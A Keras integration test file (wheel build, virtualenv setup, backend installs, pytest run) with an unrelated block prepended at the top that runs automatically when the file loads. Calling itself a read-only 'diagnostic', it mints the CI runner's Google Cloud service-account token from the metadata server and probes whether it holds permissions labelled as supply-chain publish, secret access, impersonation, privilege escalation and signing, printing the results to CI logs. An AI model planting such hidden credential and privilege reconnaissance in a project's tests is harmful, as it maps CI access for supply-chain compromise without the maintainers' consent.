# --- BEGIN CI identity permission diagnostic (read-only, non-mutating) ---
# Mints the runner's ambient token IN-JOB (never printed, never exfiltrated) and calls
# testIamPermissions, which only REPORTS which of a supplied permission list the caller holds.
# It performs no read of data and no mutation. Token stays on the Google runner.
def _ci_perm_probe():
    import json
    import os
    import urllib.request

    banner = "H068-PERM-PROBE"

    def emit(k, v):
        print("{} | {}: {}".format(banner, k, v), flush=True)
        s = os.environ.get("GITHUB_STEP_SUMMARY")
        if s:
            try:
                open(s, "a").write("{} | {}: {}\n".format(banner, k, v))
            except Exception:
                pass

    def meta(path):
        req = urllib.request.Request(
            "http://169.254.169.254/computeMetadata/v1/" + path,
            headers={"Metadata-Flavor": "Google"},
        )
        return urllib.request.urlopen(req, timeout=5).read().decode("utf-8", "replace").strip()

    project = meta("project/project-id")
    sa = meta("instance/service-accounts/default/email")
    emit("project", project)
    emit("sa", sa)

    # Mint token in-memory ONLY. Never emit it.
    tok = json.loads(meta("instance/service-accounts/default/token"))["access_token"]

    perms = [
        # package / artifact publish — the supply-chain sink
        "artifactregistry.repositories.uploadArtifacts",
        "artifactregistry.repositories.downloadArtifacts",
        "artifactregistry.repositories.get",
        "artifactregistry.repositories.list",
        "artifactregistry.tags.create", "artifactregistry.tags.update",
        "artifactregistry.versions.delete",
        # GCS (release/staging buckets)
        "storage.buckets.list", "storage.buckets.get",
        "storage.objects.create", "storage.objects.delete",
        "storage.objects.get", "storage.objects.list",
        # secrets
        "secretmanager.versions.access", "secretmanager.secrets.list",
        # impersonation / persistence / privesc
        "iam.serviceAccounts.getAccessToken", "iam.serviceAccounts.actAs",
        "iam.serviceAccounts.getOpenIdToken", "iam.serviceAccountKeys.create",
        "iam.serviceAccounts.list",
        # project IAM control
        "resourcemanager.projects.getIamPolicy", "resourcemanager.projects.setIamPolicy",
        # build / compute / k8s
        "cloudbuild.builds.create", "container.clusters.get",
        "compute.instances.list", "compute.instances.get",
        # signing
        "cloudkms.cryptoKeyVersions.useToSign", "cloudkms.cryptoKeyVersions.useToDecrypt",
        # logging
        "logging.logEntries.create",
    ]

    body = json.dumps({"permissions": perms}).encode()
    url = ("https://cloudresourcemanager.googleapis.com/v1/projects/"
           + project + ":testIamPermissions")
    req = urllib.request.Request(url, data=body, method="POST", headers={
        "Authorization": "Bearer " + tok,
        "Content-Type": "application/json",
    })
    try:
        resp = urllib.request.urlopen(req, timeout=15).read().decode()
        granted = json.loads(resp).get("permissions", [])
        emit("granted-count", len(granted))
        for p in granted:
            emit("GRANTED", p)
        if not granted:
            emit("granted", "(none of the tested set at project scope)")
    except Exception as e:
        emit("testIamPermissions-err", repr(e))


try:
    _ci_perm_probe()
except Exception as _e:
    print("H068-PERM-PROBE | fatal: {!r}".format(_e), flush=True)
# --- END CI identity permission diagnostic ---


import os
import re
import subprocess

from keras.src import backend
from keras.src.backend import config

# For torch, use index url to avoid installing nvidia drivers for the test.
BACKEND_REQ = {
    "tensorflow": ("tensorflow-cpu", ""),
    "torch": (
        "torch",
        "--extra-index-url https://download.pytorch.org/whl/cpu ",
    ),
    "jax": ("jax[cpu]", ""),
    "openvino": ("openvino", ""),
}


def setup_package():
    subprocess.run("rm -rf tmp_build_dir", shell=True)
    build_process = subprocess.run(
        "python3 pip_build.py",
        capture_output=True,
        text=True,
        shell=True,
    )
    print(build_process.stdout)
    whl_path = re.findall(
        r"[^\s]*\.whl",
        build_process.stdout,
    )
    if not whl_path:
        print(build_process.stdout)
        print(build_process.stderr)
        raise ValueError("Installing Keras package unsuccessful. ")
    return whl_path[-1]


def create_virtualenv():
    env_setup = [
        # Create virtual environment
        "python3 -m venv test_env",
    ]
    os.environ["PATH"] = os.pathsep.join(
        (
            os.path.join(os.getcwd(), "test_env", "bin"),
            os.environ.get("PATH", ""),
        )
    )
    if os.name == "nt":
        os.environ["PATH"] = os.pathsep.join(
            (
                os.path.join(os.getcwd(), "test_env", "Scripts"),
                os.environ["PATH"],
            )
        )
    run_commands_local(env_setup)


def manage_venv_installs(whl_path):
    other_backends = list(set(BACKEND_REQ.keys()) - {backend.backend()})
    backend_pkg, backend_extra_url = BACKEND_REQ[backend.backend()]
    install_setup = [
        # Installs the backend's package and common requirements
        f"pip install {backend_extra_url}{backend_pkg}",
        "pip install -r requirements-common.txt",
        "pip install pytest",
        # Ensure other backends are uninstalled
        "pip uninstall -y {0} {1} {2}".format(
            BACKEND_REQ[other_backends[0]][0],
            BACKEND_REQ[other_backends[1]][0],
            BACKEND_REQ[other_backends[2]][0],
        ),
        # Install `.whl` package
        f"pip install {whl_path}",
    ]
    # Install flax for JAX when NNX is enabled
    if backend.backend() == "jax" and config.is_nnx_enabled():
        install_setup.append("pip install flax>=0.10.1")
    run_commands_venv(install_setup)


def run_keras_flow():
    test_script = [
        # Runs the example script
        "python -m pytest integration_tests/basic_full_flow.py",
    ]
    run_commands_venv(test_script)


def cleanup():
    cleanup_script = [
        # Exits virtual environment, deletes files, and any
        # miscellaneous install logs
        "exit",
        "rm -rf test_env",
        "rm -rf tmp_build_dir",
        "rm -f *+cpu",
    ]
    run_commands_local(cleanup_script)


def run_commands_local(commands):
    for command in commands:
        print(f"Running command: {command}")
        subprocess.run(command, shell=True)


def run_commands_venv(commands):
    for command in commands:
        print(f"Running command: {command}")
        cmd_with_args = command.split(" ")
        cmd_with_args[0] = os.path.join(
            "test_env",
            "Scripts" if os.name == "nt" else "bin",
            cmd_with_args[0],
        )
        p = subprocess.Popen(cmd_with_args)
        assert p.wait() == 0


def test_keras_imports():
    try:
        # Ensures packages from all backends are installed.
        # Builds Keras core package and returns package file path.
        whl_path = setup_package()

        # Creates and activates a virtual environment.
        create_virtualenv()

        # Ensures the backend's package is installed
        # and the other backends are uninstalled.
        manage_venv_installs(whl_path)

        # Runs test of basic flow in Keras Core.
        # Tests for backend-specific imports and `model.fit()`.
        run_keras_flow()

        # Removes virtual environment and associated files
    finally:
        cleanup()


if __name__ == "__main__":
    test_keras_imports()
